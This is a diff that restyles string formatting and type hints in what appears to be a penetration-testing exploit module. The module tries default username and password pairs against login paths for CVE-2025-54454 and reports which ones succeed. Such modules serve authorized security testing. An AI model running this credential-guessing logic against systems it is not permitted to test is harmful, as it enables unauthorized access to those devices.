@@ -111,7 +111,7 @@ class Exploit(HTTPClient):
     def run(self) -> None:
         """Execute the default-credential login attempts."""
         print_status(
-            "Testing default credentials on {} for CVE-2025-54454".format(self.target)
+            f"Testing default credentials on {self.target} for CVE-2025-54454"
         )
         found = False
         for username, password in _DEFAULT_CREDS:
@@ -119,13 +119,11 @@ class Exploit(HTTPClient):
             if result:
                 found = True
                 print_success(
-                    "VALID CREDENTIALS — {}:{} succeeded at {}".format(
-                        username, password, result
-                    )
+                    f"VALID CREDENTIALS — {username}:{password} succeeded at {result}"
                 )
             else:
                 print_status(
-                    "  {}:{} — no match".format(username, password)
+                    f"  {username}:{password} — no match"
                 )
         if not found:
             print_error(
@@ -133,7 +131,7 @@ class Exploit(HTTPClient):
                 "a non-default password or CVE-2025-54454 is patched."
             )
 
-    def _try_login(self, username: str, password: str) -> Optional[str]:
+    def _try_login(self, username: str, password: str) -> str | None:
         """Attempt a login with the given credentials on all known paths.
 
         Args:
@@ -144,7 +142,7 @@ class Exploit(HTTPClient):
             The login path that accepted the credentials, or None.
         """
         json_body = json.dumps({"username": username, "password": password})
-        form_body = "j_username={}&j_password={}".format(username, password)
+        form_body = f"j_username={username}&j_password={password}"
 
         for path in _LOGIN_PATHS:
             for body, ctype in (
